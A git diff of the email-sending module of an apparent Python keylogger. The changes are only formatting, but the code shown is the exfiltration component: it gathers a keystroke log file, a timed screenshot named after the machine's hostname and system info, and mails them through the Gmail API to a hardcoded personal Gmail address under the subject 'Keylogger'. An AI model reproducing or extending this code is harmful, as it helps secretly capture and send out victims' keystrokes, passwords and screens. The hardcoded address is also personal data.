@@ -1,8 +1,12 @@
 import os, pickle, socket, threading
 
+from mimetypes import guess_type as guess_mime_type
+
+from email.mime.text import MIMEText
 from email.mime.audio import MIMEAudio
 from email.mime.base import MIMEBase
 from email.mime.image import MIMEImage
+from email.mime.multipart import MIMEMultipart
 
 from googleapiclient.discovery import build
 from google_auth_oauthlib.flow import InstalledAppFlow
@@ -10,19 +14,16 @@ from google.auth.transport.requests import Request
 
 from base64 import urlsafe_b64encode
 
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from mimetypes import guess_type as guess_mime_type
-
 from pcInfo import info
 from functions import keyloggerFn
 
 iPc = info.infoPc()
 keyloggerFn = keyloggerFn.keylogger()
 
+
 class sndEmail:
-    def __init__(self, destination = 'adrian.cristian.st@gmail.com', obj = 'Keylogger',
-                 body = f'{iPc}', attachments = ["logs/log.txt", f"{socket.gethostname()}.png"]):
+    def __init__(self, destination='adrian.cristian.st@gmail.com', obj='Keylogger',
+                 body=f'{iPc}', attachments=["logs/log.txt", f"{socket.gethostname()}.png"]):
         self.__destination = destination
         self.__obj = obj
         self.__body = body
@@ -33,11 +34,11 @@ class sndEmail:
     @property
     def gmail_authenticate(self):
         creds = None
-    
+
         if os.path.exists("token.pickle"):
             with open("token.pickle", "rb") as token:
                 creds = pickle.load(token)
-    
+
         if not creds or not creds.valid:
             if creds and creds.expired and creds.refresh_token:
                 creds.refresh(Request())
@@ -46,12 +47,11 @@ class sndEmail:
                     "credentials/credentials.json", self.scopes
                 )
                 creds = flow.run_local_server(port=0)
-    
+
             with open("token.pickle", "wb") as token:
                 pickle.dump(creds, token)
-    
-        return build("gmail", "v1", credentials=creds)
 
+        return build("gmail", "v1", credentials=creds)
 
     def timeToSend(self):
         service = self.gmail_authenticate
@@ -72,7 +72,7 @@ class sndEmail:
 def add_attachment(message: MIMEMultipart, filename: str):
     timer = threading.Timer(2, keyloggerFn.screenshot)
     timer.start()
-    
+
     content_type, encoding = guess_mime_type(filename)
 
     if content_type is None or encoding is not None:
@@ -104,6 +104,7 @@ def add_attachment(message: MIMEMultipart, filename: str):
     msg.add_header('Content-Disposition', 'attachment', filename=filename)
     message.attach(msg)
 
+
 def buildMsg(destination: str, obj: str, body: str, attachments: list[str]):
     if not attachments:
         message = MIMEText(body)
@@ -121,6 +122,7 @@ def buildMsg(destination: str, obj: str, body: str, attachments: list[str]):
             add_attachment(message, fl)
 
     return {"raw": urlsafe_b64encode(message.as_bytes()).decode()}
+
 
 def send_message(svr, destination: str, obj: str, body: str, attachments: list[str]) -> object:
     return (
